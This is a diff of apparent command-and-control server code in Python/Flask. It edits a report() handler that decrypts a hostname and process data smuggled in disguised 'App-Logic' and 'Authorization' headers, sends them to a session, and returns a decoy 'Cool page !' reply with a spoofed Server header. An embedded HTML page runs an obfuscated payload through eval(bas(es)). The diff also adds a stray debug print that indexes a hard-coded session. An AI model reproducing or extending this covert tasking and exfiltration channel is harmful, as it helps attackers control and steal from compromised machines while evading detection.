@@ -116,7 +116,7 @@ try
 }
 catch (e){}
 
-function replaceAll(find, replace, str) 
+function replaceAll(find, replace, str)
 {
   while( str.indexOf(find) > -1)
   {
@@ -166,7 +166,7 @@ eval(bas(es));
 </head>
 <body>
 </body>
-</html> 	
+</html>
 
 '''
       js = '''
@@ -218,20 +218,19 @@ def fr():
 def report():
     encrypted_host = request.headers["App-Logic"]
     hostname = decrypt_command(aes_encryption_key, encrypted_host).strip("\x00")
+    print hostname in connections_information[2][2]
     for key in connections_information.keys():
         if hostname in connections_information[key][2]:
             session = connections_information[key]
             header = request.headers["Authorization"]
             processes = decrypt_command(aes_encryption_key, header).strip("\x00").split(" ")
             esa(processes, session)
-            response = make_response("Cool page !")
-            response.headers["Server"] = server_response_header
-            return response
-
         else:
-            response = make_response("ok !")
-            response.headers["Server"] = server_response_header
-            return response
+            pass
+    response = make_response("Cool page !")
+    response.headers["Server"] = server_response_header
+    return response
+
 
 
 
